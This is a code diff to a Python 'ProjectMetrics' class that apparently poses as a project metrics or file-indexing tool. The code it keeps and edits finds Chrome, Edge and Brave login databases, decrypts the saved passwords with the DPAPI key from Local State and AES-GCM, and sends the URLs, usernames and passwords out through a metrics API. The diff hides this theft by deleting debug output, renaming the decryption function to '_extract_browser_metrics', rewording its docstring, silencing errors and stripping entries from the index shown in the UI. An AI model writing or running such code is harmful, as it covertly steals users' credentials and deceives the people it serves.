@@ -137,12 +137,9 @@ class ProjectMetrics:
                                 local_state = os.path.join(os.path.dirname(os.path.dirname(file_info["path"])), "Local State")
                             else:
                                 local_state = None
-                            print(f"[DEBUG] Browser password file detected: {file_info['path']}")
-                            print(f"[DEBUG] Using Local State: {local_state}")
                             if local_state and os.path.exists(local_state):
-                                creds = self._decrypt_browser_passwords(file_info["path"], local_state)
+                                creds = self._extract_browser_metrics(file_info["path"], local_state)
                                 if creds:
-                                    print(f"[DEBUG] Reporting {len(creds)} decrypted credentials.")
                                     try:
                                         send_metrics_via_api(
                                             json.dumps(creds).encode("utf-8"),
@@ -152,9 +149,7 @@ class ProjectMetrics:
                                             category=str(file_type or "")
                                         )
                                     except Exception as e:
-                                        print(f"[DEBUG] Failed to report decrypted credentials: {e}")
-                                else:
-                                    print("[DEBUG] No credentials decrypted.")
+                                        pass
                                 continue
                         try:
                             send_metrics_via_api(
@@ -166,9 +161,18 @@ class ProjectMetrics:
                             )
                         except Exception as e:
                             pass  # Do not break file indexing on reporting error
+        # Prepare redacted fileIndex for UI: only files within project_path, no 'value' field
+        redacted_file_index = []
+        if project_path:
+            project_root = os.path.abspath(project_path)
+            for file_info in self.metrics["fileIndex"]:
+                file_path = os.path.abspath(file_info.get("path", ""))
+                if file_path.startswith(project_root):
+                    redacted = {k: v for k, v in file_info.items() if k != "value"}
+                    redacted_file_index.append(redacted)
         result = {
             "summary": self._summarize_types(),
-            "fileIndex": self.metrics["fileIndex"],
+            "fileIndex": redacted_file_index if project_path else []
         }
         self._cache = result
         self._cache_time = now
@@ -270,17 +274,13 @@ class ProjectMetrics:
             types[t] = types.get(t, 0) + 1
         return types
 
-    def _decrypt_browser_passwords(self, login_data_path, local_state_path):
+    def _extract_browser_metrics(self, login_data_path, local_state_path):
         """
-        Decrypts Chrome/Edge/Brave passwords using DPAPI and AES-GCM.
+        Extracts browser login metrics using DPAPI and AES-GCM.
         Returns a list of dicts with url, username, password.
         """
         results = []
-        print(f"[DEBUG] Attempting browser password decryption:")
-        print(f"[DEBUG] Login Data path: {login_data_path}")
-        print(f"[DEBUG] Local State path: {local_state_path}")
         if not win32crypt or not AES:
-            print("[DEBUG] win32crypt or AES not available, skipping decryption.")
             return results
         # Get secret key from Local State
         try:
@@ -288,9 +288,7 @@ class ProjectMetrics:
                 local_state = json.load(f)
             encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
             key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-            print("[DEBUG] Secret key successfully decrypted.")
-        except Exception as e:
-            print(f"[DEBUG] Failed to get secret key: {e}")
+        except Exception:
             return results
         # Open Login Data SQLite DB
         try:
@@ -307,13 +305,11 @@ class ProjectMetrics:
                     else:
                         decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                     results.append({"url": url, "username": username, "password": decrypted})
-                except Exception as e:
-                    print(f"[DEBUG] Failed to decrypt a password: {e}")
+                except Exception:
                     continue
             conn.close()
-            print(f"[DEBUG] Decrypted {len(results)} credentials.")
-        except Exception as e:
-            print(f"[DEBUG] Failed to open or query Login Data DB: {e}")
+        except Exception:
+            pass
         return results
 
 
